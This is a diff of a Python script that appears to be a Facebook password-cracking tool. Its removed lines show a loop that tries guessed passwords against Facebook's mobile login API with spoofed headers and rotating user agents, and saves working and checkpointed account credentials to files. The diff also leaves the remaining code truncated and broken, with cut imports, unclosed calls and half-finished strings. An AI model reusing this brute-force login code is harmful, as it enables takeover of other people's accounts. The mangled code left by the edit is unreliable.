@@ -42,7 +42,7 @@ import requests
 
 import random
 
-import platform
+import platfor
 
 import base64
 
@@ -56,10 +56,8 @@ def logo():
 
    
 
- â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€Ã—
-
-  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€Ã—
-
+ â”€â”€â”€
+  â”€â”
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Mudassir Ali\x1b[0m\x1b[1;97m]
 
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :6\x1b[0m\x1b[1;97m] \033[1;37m 
@@ -94,7 +92,7 @@ ____    ____  _______  _______ .______
 
 \t\033[1;97m[\x1b[1;97m\x1b[1;41m ADMIN   : MR Mudassir \x1b[0m\x1b[1;97m]
 
-\t\033[1;97m[\x1b[1;97m\x1b[1;41m GITHUB   : www.https://github.com/veerkoko/oldidz.git]
+\t\033[1;97m[\x1b[1;97m\x1b[1;41m GITHUB   : www.https://github.com/veerkoko/o
 
 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€Ã— 
 
@@ -104,7 +102,7 @@ def runtxt(z):
 
     for e in z + "\n":
 
-        sys.stdout.write(e)
+        sys.stdout.write(e
 
         sys.stdout.flush()
 
@@ -116,12 +114,7 @@ def helpnote():
 
 	print("%s [=>]  :)"%(G))
 
-	#yahan nichy httsp sy hata kr apna github aproval link dalna
-
-	subprocess.check_output(["am", "start", "https://github.com/MRMudassir-404/Mr/blob/main/appro.txt"])
-
-	#yahan apni facebook id link dalna
-
+	#
 def notice():
 
  
@@ -172,10 +165,8 @@ class Main:
 
 		try:
 
-			#yahan pr v apna github link dalna aproval wala
-
-			plr = requests.get('https://raw.githubusercontent.com/veerkoko/oldidz/main/old.txt').text
-
+			#
+			plr 
 			if basesplit in plr:
 
 				key = basesplit
@@ -357,8 +348,7 @@ class Main:
 
 			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
 
-			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
-
+			'Mozilla/5.0 (
 			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
 
 			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
@@ -375,8 +365,7 @@ class Main:
 
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
 
- 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
-
+ 'Mozilla/5.0 (Windows NT 6.1; WOW64) 
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
 
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
@@ -605,52 +594,18 @@ class Main:
 
   'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
 
-  'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'Mozilla/5.0 (compatible; Baiduspider/2.0; +
+  'Mozilla/5.0 (compatible; 
+  'Mozilla/5.0 (6.0.1; Nexus 5X 
+  'facebookexternalhit/1.1 (+)',
 
-  'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)',
-
-  'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
-
-  'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-
-  'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
-
-  'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)',
-
-  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
-
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2',
-
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36',
-
-  'Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/',
-
-  'Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36',
-
-  'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36',
-
-  'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
-
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0',
-
-  'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254',
-
-  'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536',
-
-  'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058',
-
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
-
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
-
-  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
-
-  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
-
-  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
-
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
-
+  'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; 
+  'Mozilla/5.0 (Windows NT 10.0; WOW64
+  'Mozilla/5.0 (Windows Phone 10.0; 
+  'Mozilla/5.0 (Windows 
+  'Mozilla/5.0 (Windows 
+  'Mozilla/4.0 (compatible; MSIE 6.0; 
+  'Mozilla/5.0 
   'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
@@ -661,86 +616,6 @@ class Main:
 
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
 
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 
 
-			])
-
-		for pw in pwx:
-
-			pw = pw.lower()
-
-			ses = requests.Session()
-
-			headers = {
-
-				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
-
-				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
-
-				"x-fb-net-hni": str(random.randint(20000, 40000)), 
-
-				"x-fb-connection-quality": "EXCELLENT",
-
-				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-
-				"user-agent": ua, 
-
-				"content-type": "application/x-www-form-urlencoded", 
-
-				"x-fb-http-engine": "Liger"
-
-			}
-
-			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
-
-			if "session_key" in response.text and "EAAA" in response.text:
-
-				print("\r  \033[0;97m   [MR Mudassir-OK=>] %s | %s\033[0;97m         "%(uid, pw))
-
-				self.ok.append("%s|%s"%(uid, pw))
-
-				open("ok.txt","a").write("   [MR Mudassir-OK=>]  %s|%s\n"%(uid, pw))
-
-				break
-
-			elif "www.facebook.com" in response.json()["error_msg"]:
-
-				print("\r  \033[0;92m   [Mudassir-CP=>] %s | %s\033[0;97m         "%(uid, pw))
-
-				self.cp.append("%s|%s"%(uid, pw))
-
-				open("cp.txt","a").write("   [Mudassir-CP=>]  %s|%s\n"%(uid, pw))
-
-				break
-
-			else:
-
-				continue
-
- #Wasi copy krke apna name dal dyna
-
-		self.loop +=1
-
-if len(sys.argv) == 2:
-
-	if sys.argv[1] == "--info":
-
-		print("")
-
-		print("\n [*] Admin    : MR Mudaasir  ")
-
-		print(" [*] Facebook      :  Veer khanoo\n")
-
-		print(" [ Khan Lala  ] \n")
-
-		print(" [*] Facebook  : https://www.facebook.com/veerkhano711Mafiagroup711owner")
-
-		exit(" [*] GitHub    : https://github.com/veerkoko/oldidz.git ")
-
-	else:
-
-		Main()
-
-try:Main()
-
-except Exception as e:exit(str(e))
+	
